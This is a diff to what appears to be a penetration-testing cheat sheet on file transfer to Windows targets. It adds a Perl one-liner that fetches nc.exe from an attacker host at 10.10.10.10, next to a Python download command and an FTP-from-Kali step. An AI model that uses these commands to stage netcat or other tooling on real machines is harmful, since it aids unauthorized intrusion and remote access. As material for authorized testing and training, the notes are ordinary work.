@@ -106,6 +106,17 @@ Download a file using Python:
 python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"
 ```
 
+### Uploading Files with Perl
+Sometimes a Windows machine will have development tools like PERL installed.
+Check for PERL
+```
+perl -v
+```
+Download a file using PERL:
+```
+perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"
+```
+
 ### Uploading Files with FTP
 After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
 ```
